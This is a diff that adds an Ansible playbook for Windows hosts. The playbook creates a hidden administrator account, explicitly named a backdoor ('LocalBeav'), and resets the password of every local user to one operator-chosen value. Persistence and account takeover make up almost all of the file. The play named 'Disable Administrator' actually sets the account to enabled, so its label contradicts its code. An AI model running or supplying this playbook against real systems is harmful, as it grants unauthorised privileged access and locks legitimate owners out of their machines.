@@ -1,0 +1,53 @@
+- name: Create backdoor account "LocalBeav"
+  hosts: windows
+  gather_facts: no
+  vars_prompt:
+    - name: backdoor_password
+      prompt: "Enter the password for the backdoor account"
+      private: yes
+  tasks:
+    - name: Create new user LocalBeav
+      ansible.windows.win_user:
+        name: LocalBeav
+        password: "{{ backdoor_password }}"
+        state: present
+        groups:
+          - Users
+          - "Administrators"
+
+- name: Disable Administrator account
+  hosts: windows
+  gather_facts: no
+  tasks:
+    - name: Disable Administrator
+      ansible.windows.win_user:
+        name: Administrator
+        state: present
+        account_disabled: no
+
+- name: Change all user passwords on Windows
+  hosts: windows
+  gather_facts: yes
+  vars_prompt:
+    - name: user_password
+      prompt: "Enter the password for all users"
+      private: yes
+  tasks:
+    - name: Gather all local users on the system via PowerShell
+      ansible.windows.win_command: powershell -Command "Get-LocalUser | ConvertTo-Json"
+      register: local_users_json
+
+    - name: Set fact for local users
+      ansible.builtin.set_fact:
+        local_users: "{{ local_users_json.stdout | from_json }}"
+
+    - name: Change password for each user
+      ansible.windows.win_user:
+        name: "{{ item.Name }}"
+        password: "{{ user_password }}"
+        update_password: always
+      loop: "{{ local_users }}"
+      # Uncomment the following line to exclude the Administrator account if needed:
+      # when: item.Name != 'Administrator'
+
+
